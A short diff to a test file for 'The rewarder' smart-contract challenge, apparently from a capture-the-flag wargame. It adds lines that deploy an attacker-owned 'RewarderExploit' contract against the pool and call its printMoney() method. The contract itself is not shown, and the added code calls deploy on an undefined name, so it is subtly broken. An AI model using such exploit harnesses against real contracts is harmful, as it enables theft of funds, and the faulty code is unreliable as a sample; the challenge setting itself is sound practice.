@@ -66,6 +66,12 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        const RewarderExploitFactory = await ethers.getContractFactory('RewarderExploit', attacker);
+        console.log("Starting exploit")
+        const exploit = await RewarderExploit.deploy(this.pool.address, this.rewarderPool.address, attacker.address)
+        await exploit.printMoney()
+    
     });
 
     after(async function () {
